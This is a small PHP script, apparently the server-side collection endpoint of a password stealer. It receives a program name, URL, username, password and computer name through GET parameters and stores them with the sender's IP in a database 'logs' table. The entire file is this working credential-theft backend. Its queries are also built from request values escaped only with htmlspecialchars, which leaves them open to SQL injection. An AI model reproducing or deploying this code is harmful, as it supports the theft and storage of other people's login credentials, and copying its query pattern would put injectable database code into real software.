<?php
//*****************************************
// Author: icyinferno
// E-mail: 1cy1nferno109@gmail.com
// Copyright ©2009, IcyInferno Productions 
//*****************************************
require_once 'db_login.php';

if($_GET['a'] == "") {
   exit;
}

$c = mysql_connect(web_dbHost, web_dbUser, web_dbPass) or die('Could not connect');
	 mysql_query("INSERT INTO `".web_dbDatabase."`.`logs` (`cid`, `program`, `url`, `user`, `password`, `computer`, `date`, `ip`) VALUES 		 				(NULL, '".htmlspecialchars(urldecode($_GET['a']))."', 
	 			  '".htmlspecialchars(urldecode($_GET['b']))."', 
				  '".htmlspecialchars(urldecode($_GET['c']))."', 
				  '".htmlspecialchars(urldecode($_GET['d']))."', 
				  '".htmlspecialchars(urldecode($_GET['e']))."', 
				  '".date("Y/m/d H:i:s")."' , '".$_SERVER['REMOTE_ADDR']."')", $c);
	 mysql_close($c);
?>
